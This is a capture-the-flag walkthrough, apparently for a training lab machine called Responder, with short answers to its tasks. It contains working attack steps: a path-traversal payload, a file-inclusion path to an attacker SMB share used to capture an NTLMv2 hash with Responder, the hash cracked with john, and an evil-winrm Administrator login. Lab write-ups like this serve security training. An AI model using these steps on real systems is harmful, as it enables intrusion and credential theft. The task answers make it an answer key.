# Responder
## task 1
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# nmap -p-10000 -sV -T4 <your target ip>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 03:03 UTC
Nmap scan report for <your target ip>
Host is up (0.19s latency).
Not shown: 9998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.59 seconds
```
2
## task 2
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# curl -L <your target ip>
<meta http-equiv="refresh" content="0;url=http://unika.htb/">
```
unika.htb
## task 3
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# echo -e "<your target ip>\tunika.htb" >> /etc/hosts
```
php
## task 4
```
http://unika.htb/index.php?page=german.html
```
page
## task 5
../../../../../../../../windows/system32/drivers/etc/hosts
## task 6
//10.10.14.6/somefile
## task 7
New Technology LAN Manager
## task 8
```
responder -I
```
## task 9
john the ripper
## task 10
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# responder -I tun0
curl 'unika.htb/index.php?page=//<your tun0 ip>/<any file name>' // do this command while monitoring tun0 with responder

[SMB] NTLMv2-SSP Client   : ::ffff:<your target ip>
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:f55188e781906d32:CFC89E3F0C6EA3FA5DF6846E1D4B8AAC:01010000000000008077E6876794D801403246887B0210600000000002000800350048005900450001001E00570049004E002D004D0048003600590039003300390032004D005700320004003400570049004E002D004D0048003600590039003300390032004D00570032002E0035004800590045002E004C004F00430041004C000300140035004800590045002E004C004F00430041004C000500140035004800590045002E004C004F00430041004C00070008008077E6876794D80106000400020000000800300030000000000000000100000000200000FE3EB0F3F4BE75A3445398F8570605B5E4F69F6715A47FA212AE90CDAB80A9E10A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100330039000000000000000000

┌──(root㉿cbfc9d3c3a36)-[/mnt/src/starting_point/tier1/Responder]
└─# john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:00 DONE (2022-07-10 14:55) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
badminton
## task 11
5985
## Sebmit Flag
```
┌──(root㉿4cabba531930)-[/]
└─# evil-winrm -i <your target ip> -u Administrator -p badminton

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\mike\Desktop\flag.txt
```
